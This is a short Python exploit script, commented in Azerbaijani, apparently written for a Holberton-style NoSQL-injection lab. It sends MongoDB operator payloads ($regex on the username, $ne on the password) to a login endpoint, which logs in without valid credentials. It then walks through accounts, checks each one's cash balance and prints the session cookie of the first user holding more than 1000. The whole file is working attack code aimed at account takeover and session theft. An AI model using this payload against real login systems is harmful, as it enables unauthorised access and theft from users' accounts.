import requests
import string

# URL-ləri öz mühitinə uyğun yoxla (http://web0x01.hbtn...)
BASE_URL = "http://web0x01.hbtn/api/a3/nosql_injection"
LOGIN_URL = f"{BASE_URL}/sign_in"
USER_INFO_URL = f"{BASE_URL}/user_info"

# Şorba hərfləri (bütün hərfləri yoxlayacağıq)
chars = string.ascii_lowercase + string.ascii_uppercase + "0123456789"

print("[-] Zəngin istifadəçi axtarılır...")

for char in chars:
    # Payload: İstifadəçi adı bu hərflə başlayanları axtarırıq (Regex)
    # Məsələn: ^a (a ilə başlayan), ^b (b ilə başlayan)
    payload = {
        "username": {"$regex": f"^{char}"},
        "password": {"$ne": ""}
    }

    try:
        session = requests.Session()
        resp = session.post(LOGIN_URL, json=payload, allow_redirects=False)

        # Əgər giriş uğurludursa
        if resp.status_code == 200 or resp.status_code == 302:
            # İstifadəçi məlumatlarını və balansı çəkirik
            info_resp = session.get(USER_INFO_URL)
            data = info_resp.json()
            
            username = data.get("username", "Unknown")
            balance = data.get("cash", 0) # Və ya "balance"
            
            print(f"[+] Tapıldı: User: {username} | Balance: ${balance}")

            # Əgər balansı koin almağa çatırsa (Məsələn $10,000-dən çox)
            if float(balance) > 1000: 
                print("\n[!!!] BİNQO! Bu istifadəçinin pulu var!")
                print(f"Cookie (Sessiya): {session.cookies.get_dict()}")
                break
    except Exception as e:
        pass
